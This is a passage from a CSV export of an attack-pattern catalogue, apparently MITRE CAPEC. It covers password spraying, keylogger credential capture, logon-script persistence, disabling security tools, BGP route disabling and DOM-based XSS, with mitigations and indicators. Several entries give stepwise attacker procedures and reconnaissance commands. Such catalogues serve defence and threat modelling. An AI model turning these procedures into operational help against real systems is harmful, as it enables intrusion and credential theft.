to the web root. Disable execution on directories within the web root. Ensure that permissions of the web server process are only what is required by not using built-in accounts and instead create specific accounts to limit unnecessary access or permissions overlap across multiple systems.::\",\"\",\"::284::\",\"\",\"\",\n564,\"Run Software at Logon\",Detailed,Draft,\"Operating system allows logon scripts to be run whenever a specific user or users logon to a system. If adversaries can access these scripts, they may insert additional code into the logon script. This code can allow them to maintain persistence or move laterally within an enclave because it is executed every time the affected user or users logon to a computer. Modifying logon scripts can effectively bypass workstation and enclave firewalls. Depending on the access configuration of the logon scripts, either local credentials or a remote administrative account may be necessary.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Restrict write access to logon scripts to necessary administrators.::\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1037:ENTRY NAME:Boot or Logon Initialization Scripts::::TAXONOMY NAME:ATTACK:ENTRY ID:1543.001:ENTRY NAME:Create or Modify System Process: Launch Agent::::TAXONOMY NAME:ATTACK:ENTRY ID:1543.004:ENTRY NAME:Create or Modify System Process: Launch Daemon::::TAXONOMY NAME:ATTACK:ENTRY ID:1547:ENTRY NAME:Boot or Logon Autostart Execution::\",\"\",\n565,\"Password Spraying\",Detailed,Draft,\"In a Password Spraying attack, an adversary tries a small list (e.g. 3-5) of common or expected passwords, often matching the target's complexity policy, against a known list of user accounts to gain valid credentials. The adversary tries a particular password for each user account, before moving onto the next password in the list. This approach assists the adversary in remaining undetected by avoiding rapid or frequent account lockouts. The adversary may then reattempt the process with additional passwords, once enough time has passed to prevent inducing a lockout.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:49::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target's password policy] Determine the password policies of the target system/application.:TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Explore:DESCRIPTION:[Select passwords] Pick the passwords to be used in the attack (e.g. commonly used passwords, passwords tailored to individual users, etc.):TECHNIQUE:Select passwords based on common use or a particular user's additional details.:TECHNIQUE:Select passwords based on the target's password complexity policies.::STEP:3:PHASE:Exploit:DESCRIPTION:[Brute force password] Given the finite space of possible passwords dictated by information determined in the previous steps, try each password for all known user accounts until the target grants access.:TECHNIQUE:Manually or automatically enter the first password for each known user account through the target's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.:TECHNIQUE:Iterate through the remaining passwords for each known user account.::\",\"::The system/application uses one factor password based authentication.::The system/application does not have a sound password policy that is being enforced.::The system/application does not implement an effective password throttling mechanism.::The adversary possesses a list of known user accounts on the target system/application.::\",\"::SKILL:A Password Spraying attack is very straightforward. A variety of password cracking tools are widely available.:LEVEL:Low::\",\"::A machine with sufficient resources for the job (e.g. CPU, RAM, HD).::Applicable password lists.::A password cracking tool or a custom script that leverages the password list to launch the attack.::\",\"::Many invalid login attempts are coming from the same machine (same IP address) or for multiple user accounts within short succession.::The login attempts use passwords that have been used previously by the user account in question.::Login attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Create a strong password policy and ensure that your system enforces this policy.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::\",\"::A user selects the phrase Password123 as their password, believing that it would be very difficult to guess. Password Spraying, leveraging a list of commonly used passwords, is used to crack this password and gain access to the account.::The Iranian hacker group APT33 (AKA Holmium, Refined Kitten, or Elfin) carried out numerous Password Spraying attacks in 2019. On average, APT33 targeted 2,000 organizations per month, with upwards of 10 million authentication attempts each day. The majority of these attacks targeted manufacturers, suppliers, or maintainers of industrial control system equipment.::\",\"::521::262::263::654::307::308::309::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1110.003:ENTRY NAME:Brute Force:Password Spraying::\",\"\",\n568,\"Capture Credentials via Keylogger\",Detailed,Draft,\"An adversary deploys a keylogger in an effort to obtain credentials directly from a system's user. After capturing all the keystrokes made by a user, the adversary can analyze the data and determine which string are likely to be passwords or other credential related information.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:569::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine which user's credentials to capture] Since this is a more targeted attack, an adversary will first identify a particular user they wish the capture the credentials of.::STEP:2:PHASE:Experiment:DESCRIPTION:[Deploy keylogger] Once a user is identified, an adversary will deploy a keylogger to the user's system in one of many ways.:TECHNIQUE:Send a phishing email with a malicious attachment that installs a keylogger on a user's system:TECHNIQUE:Conceal a keylogger behind fake software and get the user to download the software:TECHNIQUE:Get a user to click on a malicious URL that directs them to a webpage that will install a keylogger without their knowledge:TECHNIQUE:Gain access to the user's system through a vulnerability and manually install a keylogger::STEP:3:PHASE:Experiment:DESCRIPTION:[Record keystrokes] Once the keylogger is deployed on the user's system, the adversary will record keystrokes over a period of time.::STEP:4:PHASE:Experiment:DESCRIPTION:[Analyze data and determine credentials] Using the captured keystrokes, the adversary will be able to determine the credentials of the user.:TECHNIQUE:Search for repeated sequences that are following by the enter key:TECHNIQUE:Search for repeated sequences that are not found in a dictionary:TECHNIQUE:Search for several backspaces in a row. This could indicate a mistyped password. The correct password can then be inferred using the whole key sequence::STEP:5:PHASE:Exploit:DESCRIPTION:[Use found credentials] After the adversary has found the credentials for the target user, they will then use them to gain access to a system in order to perform some follow-up attack::\",\"::The ability to install the keylogger, either in person or remote.::\",\"\",\"\",\"\",\"\",\"::Strong physical security can help reduce the ability of an adversary to install a keylogger.::\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1056.001:ENTRY NAME:Input Capture:Keylogging::\",\"\",\n569,\"Collect Data as Provided by Users\",Standard,Draft,\"An attacker leverages a tool, device, or program to obtain specific information as provided by a user of the target system. This information is often needed by the attacker to launch a follow-on attack. This attack is different than Social Engineering as the adversary is not tricking or deceiving the user. Instead the adversary is putting a mechanism in place that captures the information that a user legitimately enters into a system. Deploying a keylogger, performing a UAC prompt, or wrapping the Windows default credential provider are all examples of such interactions.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:116::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1056:ENTRY NAME:Input Capture::\",\"\",\n57,\"Utilizing REST's Trust in the System Resource to Obtain Sensitive Data\",Detailed,Draft,\"This attack utilizes a REST(REpresentational State Transfer)-style applications' trust in the system resources and environment to obtain sensitive data once SSL is terminated.\",\"\",Medium,Very High,\"::NATURE:ChildOf:CAPEC ID:157::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find a REST-style application that uses SSL] The adversary must first find a REST-style application that uses SSL to target. Because this attack is easier to carry out from inside of a server network, it is likely that an adversary could have inside knowledge of how services operate.::STEP:2:PHASE:Experiment:DESCRIPTION:[Insert a listener to sniff client-server communication] The adversary inserts a listener that must exist beyond the point where SSL is terminated. This can be placed on the client side if it is believed that sensitive information is being sent to the client as a response, although most often the listener will be placed on the server side to listen for client authentication information.:TECHNIQUE:Run wireshark or tcpdump on a device that is on the inside of a firewall, load balancer, or router of a network and capture traffic after SSL has been terminated::STEP:3:PHASE:Exploit:DESCRIPTION:[Gather information passed in the clear] If developers have not hashed or encrypted data sent in the sniffed request, the adversary will be able to read this data in the clear. Most commonly, they will now have a username or password that they can use to submit requests to the web service just as an authorized user::\",\"::Opportunity to intercept must exist beyond the point where SSL is terminated.::The adversary must be able to insert a listener actively (proxying the communication) or passively (sniffing the communication) in the client-server communication path.::\",\"::SKILL:To insert a network sniffer or other listener into the communication stream:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Implementation: Implement message level security such as HMAC in the HTTP communication::Design: Utilize defense in depth, do not rely on a single security mechanism like SSL::Design: Enforce principle of least privilege::\",\"::The Rest service provider uses SSL to protect the communications between the service requester (client) to the service provider. In the instance where SSL is terminated before the communications reach the web server, it is very common in enterprise data centers to terminate SSL at a router, firewall, load balancer, proxy or other device, then the adversary can insert a sniffer into the communication stream and gather all the authentication tokens (such as session credentials, username/passwords combinations, and so on). The Rest service requester and service provider do not have any way to detect this attack.::\",\"::300::287::693::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1040:ENTRY NAME:Network Sniffing::\",\"\",\n571,\"Block Logging to Central Repository\",Standard,Draft,\"An adversary prevents host-generated logs being delivered to a central location in an attempt to hide indicators of compromise.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:161::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1562.002:ENTRY NAME:Impair Defenses: Disable Windows Event Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.002:ENTRY NAME:Impair Defenses: Impair Command History Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.006:ENTRY NAME:Impair Defenses: Indicator Blocking::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.008:ENTRY NAME:Impair Defenses: Disable Cloud Logs::\",\"\",\n572,\"Artificially Inflate File Sizes\",Standard,Draft,\"An adversary modifies file contents by adding data to files for several reasons. Many different attacks could “follow” this pattern resulting in numerous outcomes. Adding data to a file could also result in a Denial of Service condition for devices with limited storage capacity.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:165::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"\",\"::An adversary could potentially increase file sizes on devices containing limited storage resources, such as SCADA or IOT devices, resulting in denial of service conditions.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1027.001:ENTRY NAME:Obfuscated Files or Information:Binary Padding::\",\"\",\n573,\"Process Footprinting\",Standard,Stable,\"An adversary exploits functionality meant to identify information about the currently running processes on the target system to an authorized user. By knowing what processes are running on the target system, the adversary can learn about the target environment as a means towards further malicious behavior.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Identify programs that may be used to acquire process information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::\",\"::On a Windows system, the command, tasklist, displays information about processes. The same function on a Mac OS system is done with the command, ps.::In addition to manual discovery of running processes, an adversary can develop malware that carries out this attack pattern before subsequent malicious action.::\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1057:ENTRY NAME:Process Discovery::\",\"\",\n574,\"Services Footprinting\",Standard,Stable,\"An adversary exploits functionality meant to identify information about the services on the target system to an authorized user. By knowing what services are registered on the target system, the adversary can learn about the target environment as a means towards further malicious behavior. Depending on the operating system, commands that can obtain services information include sc and tasklist/svc using Tasklist, and net start using Net.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Identify programs that may be used to acquire service information and block them by using a software restriction policy or tools that restrict program execution by uaing a process allowlist.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1007:ENTRY NAME:System Service Discovery::\",\"\",\n575,\"Account Footprinting\",Standard,Stable,\"An adversary exploits functionality meant to identify information about the domain accounts and their permissions on the target system to an authorized user. By knowing what accounts are registered on the target system, the adversary can inform further and more targeted malicious behavior. Example Windows commands which can acquire this information are: net user and dsquery.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Identify programs that may be used to acquire account information and block them by using a software restriction policy or tools that restrict program execution by uysing a process allowlist.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1087:ENTRY NAME:Account Discovery::\",\"\",\n576,\"Group Permission Footprinting\",Standard,Stable,\"An adversary exploits functionality meant to identify information about user groups and their permissions on the target system to an authorized user. By knowing what users/permissions are registered on the target system, the adversary can inform further and more targeted malicious behavior. An example Windows command which can list local groups is net localgroup.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Identify programs (such as net) that may be used to enumerate local group permissions and block them by using a software restriction Policy or tools that restrict program execution by using a process allowlist.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1069:ENTRY NAME:Permission Groups Discovery::::TAXONOMY NAME:ATTACK:ENTRY ID:1615:ENTRY NAME:Group Policy Discovery::\",\"\",\n577,\"Owner Footprinting\",Standard,Draft,\"An adversary exploits functionality meant to identify information about the primary users on the target system to an authorized user. They may do this, for example, by reviewing logins or file modification times. By knowing what owners use the target system, the adversary can inform further and more targeted malicious behavior. An example Windows command that may accomplish this is dir /A ntuser.dat. Which will display the last modified time of a user's ntuser.dat file when run within the root folder of a user. This time is synonymous with the last time that user was logged in.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::Administrator permissions are required to view the home folder of other users.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Ensure that proper permissions on files and folders are enacted to limit accessibility.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1033:ENTRY NAME:System Owner/User Discovery::\",\"\",\n578,\"Disable Security Software\",Standard,Usable,\"An adversary exploits a weakness in access control to disable security tools so that detection does not occur. This can take the form of killing processes, deleting registry keys so that tools do not start at run time, deleting log files, or other methods.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:176::\",\"\",\"::The adversary must have the capability to interact with the configuration of the targeted system.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Hide Activities:NOTE:By disabling certain security tools, the adversary can hide malicious activity and avoid detection.::\",\"::Ensure proper permissions are in place to prevent adversaries from altering the execution status of security tools.::\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1556.006:ENTRY NAME:Modify Authentication Process: Multi-Factor Authentication::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.001:ENTRY NAME:Impair Defenses: Disable or Modify Tools::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.002:ENTRY NAME:Impair Defenses: Disable Windows Event Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.004:ENTRY NAME:Impair Defenses: Disable or Modify System Firewall::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.007:ENTRY NAME:Impair Defenses: Disable or Modify Cloud Firewall::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.008:ENTRY NAME:Impair Defenses: Disable Cloud Logs::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.009:ENTRY NAME:Impair Defenses: Safe Mode Boot::\",\"\",\n579,\"Replace Winlogon Helper DLL\",Detailed,Draft,\"Winlogon is a part of Windows that performs logon actions. In Windows systems prior to Windows Vista, a registry key can be modified that causes Winlogon to load a DLL on startup. Adversaries may take advantage of this feature to load adversarial code at startup.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Changes to registry entries in HKLMSoftwareMicrosoftWindows NTWinlogonNotify that do not correlate with known software, patch cycles, etc are suspicious. New DLLs written to System32 which do not correlate with known good software or patching may be suspicious.::\",\"\",\"::15::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1547.004:ENTRY NAME:Boot or Logon Autostart Execution: Winlogon helper DLL::\",\"\",\n58,\"Restful Privilege Elevation\",Detailed,Draft,\"An adversary identifies a Rest HTTP (Get, Put, Delete) style permission method allowing them to perform various malicious actions upon server data due to lack of access control mechanisms implemented within the application service accepting HTTP messages.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:1::NATURE:ChildOf:CAPEC ID:180::\",\"\",\"::The attacker needs to be able to identify HTTP Get URLs. The Get methods must be set to call applications that perform operations other than get such as update and delete.::\",\"::SKILL:It is relatively straightforward to identify an HTTP Get method that changes state on the server side and executes against an over-privileged system interface:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Enforce principle of least privilege::Implementation: Ensure that HTTP Get methods only retrieve state and do not alter state on the server side::Implementation: Ensure that HTTP methods have proper ACLs based on what the functionality they expose::\",\"::The HTTP Get method is designed to retrieve resources and not to alter the state of the application or resources on the server side. However, developers can easily code programs that accept a HTTP Get request that do in fact create, update or delete data on the server. Both Flickr (http://www.flickr.com/services/api/flickr.photosets.delete.html) and del.icio.us (http://del.icio.us/api/posts/delete) have implemented delete operations using standard HTTP Get requests. These HTTP Get methods do delete data on the server side, despite being called from Get which is not supposed to alter state.::\",\"::267::269::\",\"\",\"\",\n580,\"System Footprinting\",Standard,Stable,\"An adversary engages in active probing and exploration activities to determine security information about a remote target system. Often times adversaries will rely on remote applications that can be probed for system configurations.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have logical access to the target network and system.::\",\"::SKILL:The adversary needs to know basic linux commands.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Keep patches up to date by installing weekly or daily if possible.::Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::\",\"\",\"::204::205::208::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1082:ENTRY NAME:System Information Discovery::\",\"\",\n581,\"Security Software Footprinting\",Detailed,Draft,\"Adversaries may attempt to get a listing of security tools that are installed on the system and their configurations. This may include security related system features (such as a built-in firewall or anti-spyware) as well as third-party security software.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:580::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Identify programs that may be used to acquire security tool information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1518.001:ENTRY NAME:Software Discovery:Security Software Discovery::\",\"\",\n582,\"Route Disabling\",Standard,Draft,\"An adversary disables the network route between two targets. The goal is to completely sever the communications channel between two entities. This is often the result of a major error or the use of an Internet kill switch by those in control of critical infrastructure. This attack pattern differs from most other obstruction patterns by targeting the route itself, as opposed to the data passed over the route.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:607::\",\"\",\"::The adversary requires knowledge of and access to network route.::\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Disabling a network route denies the availability of a service.::\",\"\",\"\",\"\",\"\",\"\",\n583,\"Disabling Network Hardware\",Detailed,Draft,\"In this attack pattern, an adversary physically disables networking hardware by powering it down or disconnecting critical equipment. Disabling or shutting off critical system resources prevents them from performing their service as intended, which can have direct and indirect consequences on other systems. This attack pattern is considerably less technical than the selective blocking used in most obstruction attacks.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:582::\",\"\",\"::The adversary requires physical access to the targeted communications equipment (networking devices, cables, etc.), which may be spread over a wide area.::\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Denial of Service::\",\"::Ensure rigorous physical defensive measures to keep the adversary from accessing critical systems..::\",\"\",\"\",\"\",\"\",\n584,\"BGP Route Disabling\",Detailed,Draft,\"An adversary suppresses the Border Gateway Protocol (BGP) advertisement for a route so as to render the underlying network inaccessible. The BGP protocol helps traffic move throughout the Internet by selecting the most efficient route between Autonomous Systems (AS), or routing domains. BGP is the basis for interdomain routing infrastructure, providing connections between these ASs. By suppressing the intended AS routing advertisements and/or forcing less effective routes for traffic to ASs, the adversary can deny availability for the target network.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:582::\",\"\",\"::The adversary must have control of a router that can modify, drop, or introduce spoofed BGP updates.The adversary can convince::\",\"\",\"::BGP Router::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Disabling a network route at the routing infrastructure level denies availability of that route.::\",\"::Implement Ingress filters to check the validity of received routes. However, this relies on the accuracy of Internet Routing Registries (IRRs) databases which are often not well-maintained.::Implement Secure BGP (S-BGP protocol), which improves authorization and authentication capabilities based on public-key cryptography.::\",\"::Blackholing: The adversary intentionally references false routing advertisements in order to attract traffic to a particular router so it can be dropped.::\",\"\",\"\",\"\",\n585,\"DNS Domain Seizure\",Detailed,Draft,\"In this attack pattern, an adversary influences a target's web-hosting company to disable a target domain. The goal is to prevent access to the targeted service provided by that domain. It usually occurs as the result of civil or criminal legal interventions.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:582::\",\"\",\"::This attack pattern requires that the adversary has cooperation from the registrar of the target domain.::\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Disabling a target domain at the infrastructure level denies the availability of its service to the user.::\",\"\",\"::The FBI's seizure of gambling websites, the US DOJ's seizure of child pornography websites, and Microsoft's seizure of all domains owned by the company No-IP in order to disrupt a cyberattack originating from a subset of those domains.::\",\"\",\"\",\"\",\n586,\"Object Injection\",Meta,Draft,\"An adversary attempts to exploit an application by injecting additional, malicious content during its processing of serialized objects. Developers leverage serialization in order to convert data or state into a static, binary format for saving to disk or transferring over a network. These objects are then deserialized when needed to recover the data/state. By injecting a malformed object into a vulnerable application, an adversary can potentially compromise the application by manipulating the deserialization process. This can result in a number of unwanted outcomes, including remote code execution.\",\"\",Medium,High,\"\",\"\",\"::The target application must unserialize data before validation.::\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate and exhaust available resources.::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:NOTE:Attackers can modify objects or data that was assumed to be safe from modification.::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Functions that assume information in the deserialized object is valid could be exploited.::\",\"::Implementation: Validate object before deserialization process::Design: Limit which types can be deserialized.::Implementation: Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. Use an allowlist of acceptable classes.::Implementation: Keep session state on the server, when possible.::\",\"\",\"::502::\",\"\",\"\",\n587,\"Cross Frame Scripting (XFS)\",Detailed,Draft,\"This attack pattern combines malicious Javascript and a legitimate webpage loaded into a concealed iframe. The malicious Javascript is then able to interact with a legitimate webpage in a manner that is unknown to the user. This attack usually leverages some element of social engineering in that an attacker must convinces a user to visit a web page that the attacker controls.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:103::\",\"\",\"::The user's browser must have vulnerabilities in its implementation of the same-origin policy. It allows certain data in a loaded page to originate from different servers/domains.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Cross Frame Scripting allows an adversary to steal sensitive data from a legitimate site.::\",\"::Avoid clicking on untrusted links.::Employ techniques such as frame busting, which is a method by which developers aim to prevent their site being loaded within a frame.::\",\"::An adversary-controlled webpage contains malicious Javascript and a concealed iframe containing a legitimate website login (i.e., the concealed iframe would make it appear as though the actual legitimate website was loaded). When the user interacts with the legitimate website in the iframe, the malicious Javascript collects that sensitive information.::\",\"::1021::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Cross Frame Scripting::\",\"\",\n588,\"DOM-Based XSS\",Detailed,Stable,\"This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is inserted into the client-side HTML being parsed by a web browser. Content served by a vulnerable web application includes script code used to manipulate the Document Object Model (DOM). This script code either does not properly validate input, or does not perform proper output encoding, thus creating an opportunity for an adversary to inject a malicious script launch a XSS attack. A key distinction between other XSS attacks and DOM-based attacks is that in other XSS attacks, the malicious script runs when the vulnerable web page is initially loaded, while a DOM-based attack executes sometime after the page loads. Another distinction of DOM-based attacks is that in some cases, the malicious script is never sent to the vulnerable web server at all. An attack like this is guaranteed to bypass any server-side filtering attempts to protect users.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:63::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for DOM-based XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads and special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. Specific to DOM-based XSS, the adversary is looking for areas where input is being used to directly change the DOM.:TECHNIQUE:Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of HTML special characters to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim. In DOM-based XSS, the malicious script might not even be sent to the server, since the victim's browser will manipulate the DOM itself. This can help avoid serve-side detection mechanisms.:TECHNIQUE:Change a URL parameter to include a malicious script tag.:TECHNIQUE:Add a URL fragment to alter the value of the expected Document object URL.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::\",\"::An application that leverages a client-side web browser with scripting enabled.::An application that manipulates the DOM via client-side scripting.::An application that failS to adequately sanitize or encode untrusted input.::\",\"::SKILL:Requires the ability to write scripts of some complexity and to inject it through user controlled fields in the system.:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:A successful DOM-based XSS attack can enable an adversary to exfiltrate sensitive information from the application.::SCOPE:Confidentiality:SCOPE:Authorization:SCOPE:Access Control:TECHNICAL IMPACT:Gain Privileges:NOTE:A successful DOM-based XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:A successful DOM-based XSS attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:NOTE:A successful DOM-based XSS attack can allow an adversary to tamper with application data.::\",\"::Use browser technologies that do not allow client-side scripting.::Utilize proper character encoding for all output produced within client-site scripts manipulating the DOM.::Ensure that all user-supplied input is validated before use.::\",\"::Consider a web application that enables or disables some of the fields of a form on the page via the use of a mode parameter provided on the query string. http://my.site.com/aform.html?mode=full The application’s client-side code may want to print this mode value to the screen to give the users an understanding of what mode they are in. In this example, JavaScript is used to pull the value from the URL and update the 